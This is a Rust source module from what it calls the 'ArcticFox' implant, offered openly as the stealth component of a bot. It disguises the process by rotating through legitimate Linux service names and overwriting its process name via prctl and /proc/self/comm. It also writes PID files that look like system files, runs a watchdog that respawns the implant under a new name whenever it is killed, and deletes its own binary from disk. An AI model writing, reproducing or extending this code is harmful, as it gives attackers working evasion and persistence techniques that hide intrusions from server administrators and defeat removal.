//! ArcticFox Implant Stealth — Process Camouflage & Watchdog Respawn
//!
//! Every trace of the implant blends into legitimate system activity:
//!
//! **Process name rotation:**
//!   On startup and after every kill/respawn, the implant picks a new
//!   name from a pool of common system service names (sshd, httpd, cron,
//!   dbus-daemon, systemd-journald, ftpd, rsyslogd, udevd, etc.).
//!
//! **No unique fingerprint:**
//!   Bot IDs use common-looking strings — no random hex hashes that
//!   stand out in process lists or network logs.
//!
//! **Watchdog respawn:**
//!   A lightweight watchdog process monitors the main implant. If it
//!   dies (kill -9, crash, OOM), the watchdog respawns it under a
//!   DIFFERENT common name. Alternates between names each respawn.
//!
//! **PID file camouflage:**
//!   State files are stored under /var/run/, /tmp/, or /dev/shm/ with
//!   names matching system service conventions.
//!
//! **Process argument spoofing:**
//!   argv[0] is overwritten to match the chosen service name. On Linux
//!   this uses /proc/self/comm or direct argv rewriting.

use std::path::PathBuf;
use std::process::Command;
use std::time::Duration;
use tracing::{debug, info, warn};

// ── Common Service Name Pool ────────────────────────────────────────────────

/// Process names that blend into a typical Linux server.
/// Rotated on each start/respawn to avoid patterns.
const SERVICE_NAMES: &[&str] = &[
    "sshd",
    "sshd:",
    "httpd",
    "nginx",
    "ftpd",
    "cron",
    "crond",
    "dbus-daemon",
    "systemd-journald",
    "systemd-udevd",
    "systemd-logind",
    "systemd-resolved",
    "rsyslogd",
    "auditd",
    "atd",
    "agetty",
    "dhclient",
    "ntpd",
    "containerd",
    "dockerd",
    "kubelet",
    "java",
    "node",
    "python3",
    "php-fpm",
    "mysqld",
    "postgres",
    "redis-server",
    "apache2",
];

/// Human-readable bot IDs that look like system identifiers.
/// No random hex — looks like a server hostname or service tag.
const BOT_ID_POOL: &[&str] = &[
    "web01",
    "db01",
    "cache01",
    "worker01",
    "proxy01",
    "mail01",
    "build01",
    "mon01",
    "log01",
    "queue01",
    "app01",
    "lb01",
    "backup01",
    "dev01",
    "stage01",
    "node01",
    "node02",
    "node03",
    "srv01",
    "srv02",
    "host01",
    "vm01",
    "ct01",
    "k8s-node01",
    "k8s-node02",
];

// ── PID / State File Paths ──────────────────────────────────────────────────

/// Paths where the PID file is stored — common system locations.
const PID_FILE_PATHS: &[&str] = &[
    "/var/run/sshd.pid",
    "/var/run/crond.pid",
    "/var/run/dbus.pid",
    "/var/run/rsyslogd.pid",
    "/tmp/.X11-unix",
    "/tmp/.ICE-unix",
    "/dev/shm/sem.systemd",
    "/dev/shm/sem.dbus",
];

// ── Process Camouflage ──────────────────────────────────────────────────────

/// Pick a random service name from the pool.
pub fn random_service_name() -> &'static str {
    use rand::Rng;
    let idx = rand::thread_rng().r#gen_range(0..SERVICE_NAMES.len());
    SERVICE_NAMES[idx]
}

/// Pick a random bot ID from the pool (blends as hostname).
pub fn random_bot_id() -> &'static str {
    use rand::Rng;
    let idx = rand::thread_rng().r#gen_range(0..BOT_ID_POOL.len());
    BOT_ID_POOL[idx]
}

/// Pick a random PID file path.
pub fn random_pid_path() -> &'static str {
    use rand::Rng;
    let idx = rand::thread_rng().r#gen_range(0..PID_FILE_PATHS.len());
    PID_FILE_PATHS[idx]
}

/// Overwrite process name (argv[0]) on Linux.
///
/// This changes what appears in `ps aux`, `top`, etc.
/// Must be called early in main().
#[cfg(target_os = "linux")]
pub fn camouflage_process_name(name: &str) {
    // Overwrite /proc/self/comm
    if let Err(e) = std::fs::write("/proc/self/comm", name) {
        debug!("Could not set /proc/self/comm: {e}");
    }
    // Overwrite argv[0] via /proc/self/cmdline might not work
    // but /proc/self/comm is what ps/top read
}

/// Change the process title by overwriting argv memory.
///
/// On Linux this uses prctl(PR_SET_NAME) which changes /proc/self/comm.
#[cfg(target_os = "linux")]
pub fn set_process_title(name: &str) {
    unsafe {
        // PR_SET_NAME = 15
        let name_bytes = name.as_bytes();
        let mut buf = [0u8; 16];
        let len = name_bytes.len().min(15);
        buf[..len].copy_from_slice(&name_bytes[..len]);
        libc::prctl(15, buf.as_ptr(), 0, 0, 0);
    }
}

#[cfg(not(target_os = "linux"))]
pub fn camouflage_process_name(_name: &str) {
    // Non-Linux: no-op
}

#[cfg(not(target_os = "linux"))]
pub fn set_process_title(_name: &str) {
    // Non-Linux: no-op
}

// ── Watchdog / Respawn ──────────────────────────────────────────────────────

/// Start a watchdog that monitors the parent PID and respawns
/// the implant under a new name if it dies.
///
/// The watchdog itself uses a different service name so that
/// killing one leaves the other running.
pub fn spawn_watchdog(
    parent_pid: u32,
    agent_path: PathBuf,
    config_path: PathBuf,
) -> std::io::Result<()> {
    let child = Command::new(&agent_path)
        .arg("watchdog")
        .arg("--parent-pid")
        .arg(parent_pid.to_string())
        .arg("--config")
        .arg(&config_path)
        .arg("--daemon")
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn()?;

    info!("Watchdog spawned: PID {} (parent={})", child.id(), parent_pid);
    Ok(())
}

/// Watchdog main loop — monitors parent PID, respawns on death.
pub async fn watchdog_loop(
    parent_pid: u32,
    agent_path: PathBuf,
    config_path: PathBuf,
) {
    info!("Watchdog started: monitoring PID {}", parent_pid);

    let mut current_name = random_service_name();
    camouflage_process_name(current_name);
    set_process_title(current_name);

    let check_interval = Duration::from_secs(5);
    let mut respawn_count: u32 = 0;

    loop {
        tokio::time::sleep(check_interval).await;

        // Check if parent is alive
        if !pid_alive(parent_pid) {
            warn!("Parent PID {} died. Respawning...", parent_pid);

            // Rotate to a different name each respawn
            current_name = random_service_name();
            while current_name == get_current_process_name() {
                current_name = random_service_name();
            }

            // Respawn the agent under a new name
            let child = Command::new(&agent_path)
                .arg("agent")
                .arg("--config")
                .arg(&config_path)
                .arg("--daemon")
                .arg("--stealth-name")
                .arg(current_name)
                .stdin(std::process::Stdio::null())
                .stdout(std::process::Stdio::null())
                .stderr(std::process::Stdio::null())
                .spawn();

            match child {
                Ok(c) => {
                    respawn_count += 1;
                    info!(
                        "Respawned as PID {} (name='{}', respawn #{})",
                        c.id(),
                        current_name,
                        respawn_count
                    );
                    // Become the watchdog for the new child
                    // The new child will spawn its own watchdog
                    // We exit — let the new child's watchdog take over
                    break;
                }
                Err(e) => {
                    warn!("Respawn failed: {e}. Retrying in {}s...", check_interval.as_secs() * 2);
                }
            }
        }
    }

    info!("Watchdog exiting after respawn");
}

// ── Helpers ─────────────────────────────────────────────────────────────────

/// Check if a PID is alive.
fn pid_alive(pid: u32) -> bool {
    #[cfg(target_os = "linux")]
    {
        // Check if /proc/<pid> exists
        std::path::Path::new(&format!("/proc/{}", pid)).exists()
    }
    #[cfg(not(target_os = "linux"))]
    {
        // Fallback: send signal 0
        unsafe { libc::kill(pid as i32, 0) == 0 }
    }
}

/// Get the current process name from /proc/self/comm.
fn get_current_process_name() -> String {
    std::fs::read_to_string("/proc/self/comm")
        .unwrap_or_default()
        .trim()
        .to_string()
}

/// Write a camouflaged PID file.
pub fn write_pid_file(pid: u32) {
    let path = random_pid_path();
    if let Err(e) = std::fs::write(path, format!("{}\n", pid)) {
        debug!("Could not write PID file {}: {}", path, e);
    } else {
        info!("PID file: {} (pid={})", path, pid);
    }
}

// ── Self-Deletion ───────────────────────────────────────────────────────────

/// Delete the agent binary from disk after launching.
/// The running process keeps executing from memory.
#[cfg(target_os = "linux")]
pub fn self_delete() {
    if let Ok(exe) = std::env::current_exe() {
        let _ = std::fs::remove_file(&exe);
        debug!("Self-deleted: {}", exe.display());
    }
}

/// Unlink the binary so it disappears from `ls` but keeps running.
/// Uses `unlink` syscall — the inode stays alive until the process exits.
#[cfg(target_os = "linux")]
pub fn unlink_self() {
    unsafe {
        let path = b"/proc/self/exe\0";
        libc::unlink(path.as_ptr() as *const libc::c_char);
    }
}

// ── Tests ──────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn service_names_are_plausible() {
        for name in SERVICE_NAMES {
            assert!(!name.is_empty());
            assert!(name.len() <= 16); // Linux comm limit
        }
    }

    #[test]
    fn bot_ids_are_plausible() {
        for id in BOT_ID_POOL {
            assert!(!id.is_empty());
            // Hostnames can have hex chars — that's fine. Just check it's not purely random hex (32+ chars)
            assert!(id.len() < 32, "bot ID too long: {}", id);
        }
    }

    #[test]
    fn random_service_name_returns_valid() {
        for _ in 0..100 {
            let name = random_service_name();
            assert!(SERVICE_NAMES.contains(&name));
        }
    }

    #[test]
    fn random_bot_id_returns_valid() {
        for _ in 0..100 {
            let id = random_bot_id();
            assert!(BOT_ID_POOL.contains(&id));
        }
    }

    #[test]
    fn pid_paths_are_absolute() {
        for path in PID_FILE_PATHS {
            assert!(path.starts_with('/'), "PID path must be absolute: {}", path);
        }
    }

    #[test]
    fn no_duplicate_names() {
        let mut seen = std::collections::HashSet::new();
        for name in SERVICE_NAMES {
            assert!(seen.insert(name), "Duplicate service name: {}", name);
        }
    }
}
